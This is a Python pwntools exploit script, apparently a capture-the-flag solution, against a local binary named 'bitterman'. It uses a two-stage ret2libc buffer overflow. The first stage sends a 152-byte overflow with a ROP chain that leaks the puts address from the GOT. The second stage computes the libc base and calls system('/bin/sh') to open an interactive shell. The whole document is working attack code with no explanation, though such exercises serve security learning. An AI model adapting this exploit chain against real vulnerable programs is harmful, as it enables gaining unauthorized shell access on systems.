from pwn import *

p = process('./bitterman')

context(os='linux', arch='amd64')
context.log_level = 'info'

#  400520:	ff 25 2a 07 20 00    	jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>

elf  = ELF("./bitterman")
rop  = ROP(elf.path)
libc = ELF("./rlibc.so.6")
info(rop.dump())

#stage 1
junk     = "A"*152
rop.search(regs=['rdi'], order='regs')
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
payload = junk + str(rop)

p.recvuntil("name?")
p.sendline("spooks7")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")

leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
log.success("Leaked puts@GLIBC " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

#stage 2
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
info(rop2.dump())
payload  = junk + str(rop2)

#p.recvuntil("name?")
p.sendline("spooks7")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.interactive()










